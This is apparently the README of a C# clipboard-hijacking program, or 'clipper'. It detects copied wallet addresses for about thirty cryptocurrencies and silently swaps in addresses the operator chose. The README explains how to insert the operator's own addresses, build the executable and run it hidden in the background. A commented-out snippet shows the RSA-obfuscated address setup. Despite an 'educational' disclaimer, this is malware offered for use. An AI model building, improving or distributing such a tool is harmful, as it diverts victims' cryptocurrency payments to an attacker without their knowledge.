# Clipboard Crypto Address Replacer
This project is a C# application that replaces cryptocurrency wallet addresses copied to the clipboard with predefined addresses. The application detects wallet addresses using regex patterns for different cryptocurrencies and replaces them using RSA encryption.  

## Features
- **Clipboard Monitoring:** Continuously checks clipboard content.  
- **Crypto Wallet Address Detection:** Uses regex patterns to detect supported cryptocurrency addresses.  
- **RSA Encryption & Decryption:** Encrypts addresses and replaces them as needed.  
- **Mutual Exclusion (Mutex) Usage:** Ensures only one instance runs at a time.  
- **Secure Address Management:** Predefined addresses are stored using RSA encryption.  

## Supported Cryptocurrencies
This application can detect the addresses of the following cryptocurrencies:  
- Bitcoin (BTC)  
- Litecoin (LTC)  
- Ethereum (ETH)  
- Monero (XMR)  
- Ripple (XRP)  
- NEO (NEO)  
- Bitcoin Cash (BCH)  
- Dogecoin (DOGE)  
- Dash (DASH)  
- Stellar (XLM)  
- Binance Beacon (BNB) (Removed) 
- Tezos (XTZ)  
- Tron (TRX)  
- VeChain (VET)  
- Nano (NANO)  
- DigiByte (DGB)  
- Qtum (QTUM)  
- NEM (XEM)  
- Waves (WAVES)  
- Zcash (ZEC)  
- Cardano (ADA)  
- Polkadot (DOT)  
- Cosmos (ATOM)  
- Lisk (LSK)  
- Kava (KAVA)  
- Algorand (ALGO)  
- Filecoin (FIL)  
- Terra (LUNA)  
- Thorchain (RUNE)  

## Usage  

### Requirements  
- Visual Studio 2022
- .NET Framework must be installed.  
- Windows operating system is required (uses Clipboard API).

### Compilation
- Download the project to your computer
- Extract the project to a Folder.
- Open Solution File
- Write your own addresses where `*_ADDRESS` is written. If not present, leave blank
- Select **Build Solution** from the **Build** menu.

### Execution

- Compiled File Location: `.\bin\Debug\Clipper.exe`
- When you run the file, it runs silently in the background.

https://github.com/user-attachments/assets/e55ef5f5-71f5-45fe-bb74-9afebea2fd10

## Contributing  

**⭐ Star this repository if you find it useful!**
<!---
## Address
```csharp

        encryptedData.Add("btc", EncryptData(publicKey, Encoding.UTF8.GetBytes("BTC_ADDRESS")));
        encryptedData.Add("ltc", EncryptData(publicKey, Encoding.UTF8.GetBytes("LTC_ADDRESS")));
        encryptedData.Add("xmr", EncryptData(publicKey, Encoding.UTF8.GetBytes("XMR_ADDRESS")));
        encryptedData.Add("eth", EncryptData(publicKey, Encoding.UTF8.GetBytes("ETH_ADDRESS")));
        encryptedData.Add("xrp", EncryptData(publicKey, Encoding.UTF8.GetBytes("XRP_ADDRESS")));
        encryptedData.Add("neo", EncryptData(publicKey, Encoding.UTF8.GetBytes("NEO_ADDRESS")));
        encryptedData.Add("bch", EncryptData(publicKey, Encoding.UTF8.GetBytes("BCH_ADDRESS")));
        encryptedData.Add("doge", EncryptData(publicKey, Encoding.UTF8.GetBytes("DOGE_ADDRESS")));
        encryptedData.Add("dash", EncryptData(publicKey, Encoding.UTF8.GetBytes("DASH_ADDRESS")));
        encryptedData.Add("xlm", EncryptData(publicKey, Encoding.UTF8.GetBytes("XLM_ADDRESS")));
        /*encryptedData.Add("tethersol", EncryptData(publicKey, Encoding.UTF8.GetBytes("SOLANA_ADDRESS")));*/
        encryptedData.Add("bnbbeacon", EncryptData(publicKey, Encoding.UTF8.GetBytes("BNB_ADDRESS")));
        encryptedData.Add("tezos", EncryptData(publicKey, Encoding.UTF8.GetBytes("TEZ_ADDRESS")));
        encryptedData.Add("tron", EncryptData(publicKey, Encoding.UTF8.GetBytes("TRON_ADDRESS")));
        encryptedData.Add("vet", EncryptData(publicKey, Encoding.UTF8.GetBytes("VET_ADDRESS")));
        encryptedData.Add("nano", EncryptData(publicKey, Encoding.UTF8.GetBytes("NANO_ADDRESS")));
        encryptedData.Add("dgb", EncryptData(publicKey, Encoding.UTF8.GetBytes("DGB_ADDRESS")));
        encryptedData.Add("qtum", EncryptData(publicKey, Encoding.UTF8.GetBytes("QTUM_ADDRESS")));
        encryptedData.Add("xem", EncryptData(publicKey, Encoding.UTF8.GetBytes("XEM_ADDRESS")));
        encryptedData.Add("waves", EncryptData(publicKey, Encoding.UTF8.GetBytes("WAVES_ADDRESS")));
        encryptedData.Add("zec", EncryptData(publicKey, Encoding.UTF8.GetBytes("ZEC_ADDRESS")));
        encryptedData.Add("ada", EncryptData(publicKey, Encoding.UTF8.GetBytes("ADA_ADDRESS")));
        encryptedData.Add("dot", EncryptData(publicKey, Encoding.UTF8.GetBytes("DOT_ADDRESS")));
        encryptedData.Add("cosmos", EncryptData(publicKey, Encoding.UTF8.GetBytes("COSMOS_ADDRESS")));
        encryptedData.Add("lsk", EncryptData(publicKey, Encoding.UTF8.GetBytes("LSK_ADDRESS")));
        encryptedData.Add("kava", EncryptData(publicKey, Encoding.UTF8.GetBytes("KAVA_ADDRESS")));
        encryptedData.Add("algo", EncryptData(publicKey, Encoding.UTF8.GetBytes("ALGO_ADDRESS")));
        encryptedData.Add("fil", EncryptData(publicKey, Encoding.UTF8.GetBytes("FIL_ADDRESS")));
        encryptedData.Add("terra", EncryptData(publicKey, Encoding.UTF8.GetBytes("TERRA_ADDRESS")));
        encryptedData.Add("thor", EncryptData(publicKey, Encoding.UTF8.GetBytes("THOR_ADDRESS")));
```--->
## Disclaimer

This project is for **educational and research purposes only**. Malicious or unethical use is strictly discouraged. Users should assess their own risks before executing this code.

## License  
This project is open-source and licensed under the MIT License.  
